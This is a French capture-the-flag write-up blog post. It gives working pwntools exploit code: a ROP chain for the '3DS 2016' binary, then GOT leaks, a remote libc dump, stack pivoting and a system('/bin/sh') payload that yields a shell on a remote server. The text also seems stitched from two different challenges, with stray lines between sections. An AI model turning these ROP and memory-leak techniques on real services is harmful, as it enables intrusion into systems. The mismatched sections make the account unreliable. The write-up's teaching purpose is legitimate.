@@ -1,0 +1,397 @@
+---
+layout: post
+title: "3DS 2016 CTF"
+date: semaine 20 décembre 2016
+comments: true
+categories: wu
+---
+Le binaire presente les caractéristiques suivantes:
+```
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE
+```
+Il s'agit d'un binaire ne produisant aucune sortie, avec dans son code des fonctions non appelées, le main, se contentant de lire un buffer sur l'entrée standard avec la possibilité de faire un nuffer overflow (PAD="ABCDEFGHIJKLMNOPQRST").
+Les fonctions sont less suivantes:
+```
+e84b0=0x080484b0 #met esp dans ebx
+e8ac0=0x08048ac0 #??
+e84f0=0x080484f0 #?? (les 2 jouent avec 804a038)
+e8580=0x08048580 #fait un exit
+e8590=0x08048590 #ouvre le fichier en 804a039=NOM, et le balance sur stdout
+e8610=0x08048610 #si esp contient b0b01337, il rajoute .teta à NOM
+e8650=0x08048650 #si esp contient b0b01337, il rajoute .text à NOM
+e8690=0x08048690 #si esp contient 1b0b0c41 et ae13374e, il rajoute mflag à NOM
+e86d0=0x080486d0 #imprime un message What am I doing here?
+```
+nom est initalement à vide. Il suffit donc d'appeler tour à tour les fonctions e8690, e8650, e8590 et e8580 pour avoir le flag. C'est fonctions se déclenchent si et seulement si la pile contient des octets bien précis.
+On a juste besoin de gadgets pop et d'enchainer les fonctions. Cela se fait à l'aide de la chaine suivante:
+```
+chaine=PAD+p32(e8690)+p32(pop2)+p32(eb1b1)+p32(eb2b2)+p32(e8650)+p32(pop1)+p32(ebobo)+p32(e8590)+p32(e8580)
+```
+avec 
+```
+ebobo=0xb0b01337
+eb1b1=0x1b0b0c41
+eb2b2=0xae13374e
+pop1=0x80483c9
+pop2=0x0804878a
+
+```
+Cette chaine envoyée donne en retour 3DS{n0_symb0l5_w1th_R0P_15_p41nful_r1ght} (flag espéré). À noter que le fichier mflag.teta contient 3DS{why_n0_sym`b0l5_th15_hurt5}
+
+Ce challenge avait une partie bonus. On peut essayer d'avoir un shell sur le serveur. Une première fuite se fait en appelant la fonction printf en demandant le contenu de l'entrée de gets dans la got:
+
+```
+getsgot=elf.got['gets']
+chainepr=PAD+p32(printfplt)+p32(pop1)+p32(getsgot)+p32(e8580)
+```
+Il est indispensable de sortir correctement du programme faute de quoi aucune sortie n'est récupérée sauf à exécuter plusieurs fois l'impression en bouclant le programme via la chaine
+```
+chainepr1=PAD+p32(printfplt)+p32(pop1)+p32(getsgot)+p32(printfplt)+p32(pop1)+p32(ret)+p32(main)
+
+```
+cette chaine fait boucler le programme en rappelant la fonction main, en lui fournissant plusieurs fois la chaine, on finit par provoquer l'envoi du buffer. En tout état de cause on obtient
+```
+francois@aramis:~/BFF/beers4flags/writeups/3DS2016/pwn/please-no$ python payplease.py 1
+[*] '/home/francois/BFF/beers4flags/writeups/3DS2016/pwn/please-no/please-no'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE
+[+] Opening connection to 209.190.1.131 on port 9003: Done
+[+] Recieving all data: Done (32B)
+[*] Closed connection to 209.190.1.131 port 9003
+0804a010 :  a0 2a 67 f7   06 84 04 08     16 84 04 08   26 84 04 08       .*g. ....  .... &...  
+0804a020 :  80 b1 62 f7   46 84 04 08     56 84 04 08   66 84 04 08       \x80.b. F...  V... f...  
+  
+\xa0*g��\x16\x84\x0&\x84\x0\x80\xb1b�F�V\x84\x0f\x84\x0
+francois@aramis:~/BFF/beers4flags/writeups/3DS2016/pwn/please-no$ python payplease.py 1
+[*] '/home/francois/BFF/beers4flags/writeups/3DS2016/pwn/please-no/please-no'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE
+[+] Opening connection to 209.190.1.131 on port 9003: Done
+[+] Recieving all data: Done (32B)
+[*] Closed connection to 209.190.1.131 port 9003
+0804a010 :  a0 ea 5f f7   06 84 04 08     16 84 04 08   26 84 04 08       .._. ....  .... &...  
+0804a020 :  80 71 5b f7   46 84 04 08     56 84 04 08   66 84 04 08       \x80q[. F...  V... f...  
+  
+\xa0�_�\x06\x84\x0\x16\x84\x0&\x84\x0\x80q[�F�V\x84\x0f\x84\x0
+francois@aramis:~/BFF/beers4flags/writeups/3DS2016/pwn/please-no$ 
+```
+Cela permet de constater plusieurs choses:
+1) Il y a l'ASLR (avec un entropie classique, un bf est envisageable)
+2) Le programme est appelé avec socat ou équivalent
+3) La libc est une libc6_2.24-3ubuntu1_i386 d'après la libcdatabase master
+
+Pour obtenir un shell une première tentative a été de forcer la sortie du buffer de stdout en le remplissant, de récupérer le décalgae en mémoire et de renvoyer un payload final. Malheureusement cela n'a pas marché, la sortie a bien lieu au bout d'un certain temps mais sans doute à cause d'un segfault due à une croissance permanent de la valeur d'ESP.
+Bref, le bf s'est imposé. 
+Your changes have been recorded!
+```
+Program received signal SIGSEGV, Segmentation fault.
+--------------------------------------------------------------------------[regs]
+  EAX: 0x00000022  EBX: 0xf7fac000  ECX: 0xffffffff  EDX: 0xf7fad878  o d I t S z a P c 
+  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x59585756  ESP: 0xffffd050  EIP: 0x4140405a
+  CS: 0023  DS: 002b  ES: 002b  FS: 0000  GS: 0063  SS: 002bError while running hook_stop:
+Cannot access memory at address 0x4140405a
+0x4140405a in ?? ()
+```
+Cela nous donne bien un buffer overflow sur au niveau de Z@@A, pour être précis, on a un tampon de remplissage ABCDEFGHIJKLMNOPQRSTU suivi de l'écrasement de <EBP> puis <EIP> et la suite.
+
+Le mot de passe de Donald Trump est flag_is_here_on_server!!.
+
+On va donc essayer de prendre un shell.
+
+Le prelude du programme est le suivant:
+```
+chaine=PAD
+chaine+=p32(nom1)	<---- au pif
+chaine+=p32(puts_plt)	<---- affiche ce qui est pointé par
+chaine+=p32(pop1)	      malloc_got
+chaine+=p32(malloc_got)
+chaine+=p32(puts_plt)	<---- affiche «Deductible»
+chaine+=p32(pop1)
+chaine+=p32(deductible)
+chaine+=p32(puts_plt)	<---- reaffiche malloc_got 
+chaine+=p32(pop1)
+chaine+=p32(malloc_got)
+chaine+=p32(gets_plt)	<---- lit la pile suivante
+chaine+=p32(pop1)
+chaine+=p32(pile)	<---- à l'endroit pile (0x804b880)
+chaine+=p32(puts_plt)	<---- affichage de cette pile
+chaine+=p32(pop1)
+chaine+=p32(pile)
+chaine+=p32(pop_ebp)	<---- on passe sur cette pile
+chaine+=p32(pile)
+chaine+=p32(leave)
+rep=send("eductible",chaine)
+```
+La fonction send ci dessous effectue le bufferoverflow et renvoit la réponse dès la réception du mot attente ("Deductible", "Income" ... vont servir de balises)
+```
+def send(attente,test): 
+    p.send("1\n")
+    time.sleep(TIME)
+
+    print p.recvuntil(": ")
+    p.send("m\n")
+    time.sleep(TIME)
+    print p.recvuntil(": ")
+    p.send("m\n")
+    time.sleep(TIME)
+    print p.recvuntil(": ")
+    p.send("m\n")
+    time.sleep(TIME)
+    print p.recvuntil(": ")
+    p.send("m\n")
+    print p.recvuntil("m")
+    p.send("3\n")
+    time.sleep(TIME)
+
+    print p.recvuntil(": ")
+    p.send("m\n")
+    time.sleep(TIME)
+    print p.recvuntil(": ")
+    p.send("m\n")
+    time.sleep(TIME)
+    print p.recvuntil(": ")
+    p.send("1\n")
+    time.sleep(TIME)
+    print p.recvuntil(": ")
+    p.send("1\n")
+    time.sleep(TIME)
+    print p.recvuntil("y/n")
+    p.send(test+"\n")
+    time.sleep(TIME)
+    if (len(attente) > 0):
+        try:
+            readbuffer=p.recvuntil(attente)
+            return(readbuffer)
+        except:
+            readbuffer=p.recvall(TIME)
+            return readbuffer
+    else:
+        readbuffer=p.recvall(TIME)
+        return readbuffer
+```
+
+après ce prélude, en faisant
+```
+#time.sleep(20)
+malloc=word(rep[36:36+4])
+print "Malloc=",hex(malloc)
+```
+malloc contient l'adresse de malloc dans la libc qui devrait permettre d'obtenir celle de «system». L'execution de 
+```
+def getsystem(cmd):
+    chaine=p32(pile)
+    chaine+=p32(system)	<--- appel de system
+    chaine+=p32(pop1)
+    chaine+=p32(pile+16)
+    chaine+=cmd+"\x00"	<--- pour executer la commande cmd
+    chaine+="\n"
+    p.send(chaine)
+    return()
+
+getsystem("/bin/sh")
+#print p.recvall(1)
+p.interactive()
+```
+
+Souci: cette fameuse adresse system. La libc n'est pas dans la libc-database, il faut donc faire un dump de cette libc. Mais la connexion n'est pas fameuse, le mieux est de boucler en conservant le plus possible la connexion (qui coupe au bout de 30s). On va donc boucler en switchant entre deux piles: Ce sont les deux fonctions getadd1 et getadd2 qui font cela:
+```
+def getadd1(adr):
+    chaine=p32(pile)
+    chaine+=p32(puts_plt)	<--- affiche deductible
+    chaine+=p32(pop1)
+    chaine+=p32(deductible)
+    chaine+=p32(puts_plt)	<--- lit adr jusqu'au premier 00
+    chaine+=p32(pop1)
+    chaine+=p32(adr)
+    chaine+=p32(puts_plt)	<--- affiche Income
+    chaine+=p32(pop1)
+    chaine+=p32(income)
+    chaine+=p32(gets_plt)	<--- Fabrique pile2 par gets
+    chaine+=p32(pop1)
+    chaine+=p32(pile2)
+    chaine+=p32(puts_plt)
+    chaine+=p32(pop1)
+    chaine+=p32(correct)	<--- affiche correct
+    chaine+=p32(pop_ebp)	<--- switche sur la pile2
+    chaine+=p32(pile2)
+    chaine+=p32(leave)
+    chaine+="\n"
+    p.send(chaine)
+    recu=p.recvuntil("Income")
+    buf=recu[recu.index("Deductible")+17:recu.index("Income")-1]+"\x00"
+# buf contient la partie utile de la mémoire
+    print 'len buf=',len(buf)
+    return(buf)
+
+# fonction sysmétrique switchant de pile2 à pile
+
+def getadd2(adr):
+    chaine=p32(pile2)
+    chaine+=p32(puts_plt)
+    chaine+=p32(pop1)
+    chaine+=p32(deductible)
+    chaine+=p32(puts_plt)
+    chaine+=p32(pop1)
+    chaine+=p32(adr)
+    chaine+=p32(puts_plt)
+    chaine+=p32(pop1)
+    chaine+=p32(income)
+    chaine+=p32(gets_plt)
+    chaine+=p32(pop1)
+    chaine+=p32(pile)
+    chaine+=p32(puts_plt)
+    chaine+=p32(pop1)
+    chaine+=p32(correct)
+    chaine+=p32(pop_ebp)
+    chaine+=p32(pile)
+    chaine+=p32(leave)
+    chaine+="\n"
+    p.send(chaine)
+    recu=p.recvuntil("Income")
+    buf=recu[recu.index("Deductible")+17:recu.index("Income")-1]+"\x00"
+    print 'len buf=',len(buf)
+    return(buf)
+```
+
+La lecture de la mémoire se fait par
+```
+l=0
+long=0x1000	<---- longueur voulue
+offset=0x00041000
+buffer=""
+while(l<long):
+    OK=0
+    nessai=5
+    while(OK==0):
+        p=remote(host,port)
+        try:
+            p.recvuntil("Trump")
+            chaine=PAD
+            chaine+=p32(nom1)
+            chaine+=p32(puts_plt)
+            chaine+=p32(pop1)
+            chaine+=p32(malloc_got)
+            chaine+=p32(puts_plt)
+            chaine+=p32(pop1)
+            chaine+=p32(deductible)
+            chaine+=p32(puts_plt)
+            chaine+=p32(pop1)
+            chaine+=p32(malloc_got)
+            chaine+=p32(gets_plt)
+            chaine+=p32(pop1)
+            chaine+=p32(pile)
+            chaine+=p32(puts_plt)
+            chaine+=p32(pop1)
+            chaine+=p32(pile)
+            chaine+=p32(pop_ebp)
+            chaine+=p32(pile)
+            chaine+=p32(leave)
+            rep=send("eductible",chaine)
+            malloc=word(rep[36:36+4])
+            print "Malloc=",hex(malloc)
+    # zone où on veut lire	    
+            zone_a_lire=malloc-0x00075b60+ offset
+            print 'delta=',hex(0*16)	   <--- pour s'y retrouver
+            while(l<long):
+                buf=getadd1(zone_a_lire+l)
+                dump(zone_a_lire+l,buf)	   <--- affichage
+                buffer=buffer+buf
+		lp=len(buf)
+                buf=getadd2(zone_a_lire+l+lp)
+                dump(zone_a_lire+l+lp,buf)	<--- idem
+                l=len(buffer)
+                
+            OK=1	<--- FINI!!
+        except:			<--- cas où la connexion se coupe
+            OK=0
+            nessai=nessai-1	<--- shoot again!
+            if (nessai==0):
+                nessai=5
+                buffer=buffer+"\xff"
+                l=len(buffer)
+        p.close()
+    
+fic=open("libc6","w")		<---- on enrgistre le truc...
+fic.write(buffer)
+fic.close()
+```
+
+Cela permet de trouver un offset_system valant 0x00040440.
+On ontient enfin la session shell:
+```
+francois@athos:~/BFF/Pwn2016$ python irs3.py 1
+[+] Opening connection to irs.pwn.republican on port 4127: Done
+
+Enter the name: 
+Enter the password: 
+Enter the income: 
+Enter the deductions: 
+Thank you for doing your civic duty m
+!
+Welcome to the IRS!
+How may we serve you today?
+1. File a tax return
+2. Delete a tax return
+3. Edit a tax return
+4. View a tax return
+5. Exit
+
+Tax returns on file:
+0 - Donald Trump
+1 - m
+Enter the name of the file to edit: 
+Enter the password: 
+Enter the new income: 
+Enter the new deductible: 
+Is this correct?
+Income: 1
+Deductible: 1
+y/n
+Malloc= 0xf7611060
+[*] Switching to interactive mode
+: %d
+
+`\x10a�@`
+$       \x80\xb8\x0@\xb9]���\x90\xb8\x0/bin
+$ ls -al
+total 100644
+drwxr-xr-x 2 ubuntu ubuntu      4096 Nov  6 02:01 .
+drwxr-xr-x 6 ubuntu ubuntu      4096 Nov  5 05:05 ..
+-rwxr-xr-x 1 ubuntu ubuntu     15408 Nov  5 00:22 main
+-rw------- 1 ubuntu ubuntu 103026003 Nov  7 00:39 nohup.out
+-rwxr-xr-x 1 ubuntu ubuntu       130 Nov  5 05:05 setup.sh
+$  
+```
+
+AND NO FLAG!!!!! Blood and guts!
+
+Bon, en fait sournoisement, le binaire n'est pas le même et le flag est le mot sde passe de Trump sur le serveur. Ayant le shell on peut faire
+```
+$  strings main | grep flag -A5 -B5
+PTRh`
+QVh9
+Dona
+ld T
+rump
+flag
+{c4n
+_1_g
+3t_a
+_r3f
+und}
+[...]
+```
+et on obtient flag{c4n_1_g3t_a_r3fund}.
+
+Un CTF qui me laisse amer!!
+ 
